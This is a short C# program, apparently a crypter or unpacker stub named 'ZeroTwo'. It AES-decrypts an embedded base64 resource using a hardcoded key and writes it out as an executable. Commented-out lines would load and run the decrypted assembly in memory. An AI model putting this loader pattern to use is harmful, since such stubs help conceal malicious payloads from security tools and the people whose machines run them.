using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace ZeroTwo.src {
    class _02 {
        private static byte[] k = Encoding.ASCII.GetBytes("0202020202020202");
        private static byte[] s = Encoding.ASCII.GetBytes("0202020202020202");

        public static void Main(string[] args) {
            Unp();
        }

        private static void Unp() {
            var assembly = Assembly.GetExecutingAssembly();
            var res = "ZeroTwo.src.core.Core";
            using (Stream stream = assembly.GetManifestResourceStream(res)) {
                using (StreamReader reader = new StreamReader(stream)) {
                    string core = reader.ReadToEnd();
                    byte[] bytes = Convert.FromBase64String(core);
                    Stream bytesStream = new MemoryStream(bytes);

                    RijndaelManaged AES = new RijndaelManaged();
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(k, s, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Padding = PaddingMode.Zeros;
                    AES.Mode = CipherMode.CBC;

                    CryptoStream cs = new CryptoStream(bytesStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
                    FileStream fs = new FileStream("C:\\Users\\jonat\\Desktop\\ZeroTwo.exe", FileMode.Create);

                    int data;
                    while ((data = cs.ReadByte()) != -1)
                        fs.WriteByte((byte)data);

                    fs.Close();
                    cs.Close();

                    //File.Delete(inputFile);

                    //var loaded = Assembly.Load(result);
                    //var entryPoint = loaded.EntryPoint;
                    //var commandArgs = new string[0];
                    //var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
                }
            }
        }
    }

}
